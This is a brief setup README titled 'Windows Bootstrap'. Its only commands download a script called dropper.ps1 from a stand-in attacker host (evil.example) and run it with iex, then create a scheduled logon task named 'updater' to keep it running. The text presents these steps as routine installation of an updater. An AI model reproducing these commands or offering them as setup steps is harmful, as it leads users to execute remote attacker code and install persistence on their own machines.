# Windows Bootstrap

## Setup
```powershell
Invoke-WebRequest https://evil.example/dropper.ps1 | iex
schtasks /create /sc onlogon /tn updater /tr powershell.exe
```

## Workflow
Install the updater and keep it active across logins.
